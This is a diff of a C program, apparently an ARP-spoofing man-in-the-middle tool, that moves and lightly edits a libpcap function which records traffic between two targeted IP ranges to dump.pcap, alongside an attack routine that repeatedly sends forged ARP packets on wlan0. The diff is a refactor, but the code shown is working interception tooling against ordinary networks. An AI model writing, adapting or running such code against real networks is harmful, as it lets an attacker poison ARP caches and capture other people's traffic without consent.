@@ -6,52 +6,10 @@
 const char* dev = "wlan0";
 const char* dumpfile = "dump.pcap";
 
-
-void capture(const char* ip1, const char* ip2){
-	pcap_t* p;
-	pcap_dumper_t *pdump;
-	char errbuf[PCAP_ERRBUF_SIZE];
-	struct bpf_program bpfprog;
-	char filtercmd[256];
-
-	sprintf(filtercmd, "ip && ((net %s) || (net %s))", ip1, ip2);
-
-	p = pcap_open_live(dev, 66536, 1,10,errbuf);
-	if(p == NULL){
-		fprintf(stderr, "%s\n", errbuf);
-		return;
-	}
-	if(pcap_compile(p, &bpfprog, filtercmd, 0, 0) < 0){
-		fprintf(stderr, "compile: %s\n", pcap_geterr(p));
-		pcap_close(p);
-		return;
-	}
-	if(pcap_setfilter(p, &bpfprog) < 0){
-		fprintf(stderr, "setfilter: %s\n", pcap_geterr(p));
-		pcap_close(p);
-		return;
-	}
-	pdump = pcap_dump_open(p, dumpfile);
-	if(pdump == NULL){	
-		fprintf(stderr, "%s\n", pcap_geterr(p));
-		pcap_close(p);
-		return;
-	}
-	if(pcap_loop(p, 0, pcap_dump, (u_char*)pdump) < 0){
-		fprintf(stderr, "%s\n", pcap_geterr(p));
-		pcap_dump_close(pdump);
-		pcap_close(p);
-		return;
-	}
-
-	pcap_dump_close(pdump);
-	pcap_close(p);
-	return;
-}
-
-
 void mitm_attack(const char* ip1, const char* mac1, 
-		const char* ip2, const char* mac2);
+					const char* ip2, const char* mac2);
+void capture(const char* ip1, const char* ip2);
+
 
 
 int main(int argc,char** argv){
@@ -66,7 +24,7 @@ int main(int argc,char** argv){
 
 
 void mitm_attack(const char* ip1, const char* mac1, 
-		const char* ip2, const char* mac2){
+					const char* ip2, const char* mac2){
 	pgen_arp pack_to_target1;
 	pgen_arp pack_to_target2;
 
@@ -97,4 +55,46 @@ void mitm_attack(const char* ip1, const char* mac1,
 		pack_to_target2.SEND(dev);
 		sleep(1);
 	}		
+}
+
+
+void capture(const char* ip1, const char* ip2){
+	pcap_t* handle;
+	pcap_dumper_t *pdump;
+	char errbuf[PCAP_ERRBUF_SIZE];
+	struct bpf_program bpfprog;
+	char filtercmd[256];
+	sprintf(filtercmd, "ip && ((net %s) || (net %s))", ip1, ip2);
+
+	handle = pcap_open_live(dev, 66536, 1,10,errbuf);
+	if(handle == NULL){
+		fprintf(stderr, "%s\n", errbuf);
+		return;
+	}
+	if(pcap_compile(handle, &bpfprog, filtercmd, 0, 0) < 0){
+		fprintf(stderr, "compile: %s\n", pcap_geterr(handle));
+		pcap_close(handle);
+		return;
+	}
+	if(pcap_setfilter(handle, &bpfprog) < 0){
+		fprintf(stderr, "setfilter: %s\n", pcap_geterr(handle));
+		pcap_close(handle);
+		return;
+	}
+	pdump = pcap_dump_open(handle, dumpfile);
+	if(pdump == NULL){	
+		fprintf(stderr, "%s\n", pcap_geterr(handle));
+		pcap_close(handle);
+		return;
+	}
+	if(pcap_loop(handle, 0, pcap_dump, (u_char*)pdump) < 0){
+		fprintf(stderr, "%s\n", pcap_geterr(handle));
+		pcap_dump_close(pdump);
+		pcap_close(handle);
+		return;
+	}
+
+	pcap_dump_close(pdump);
+	pcap_close(handle);
+	return;
 }
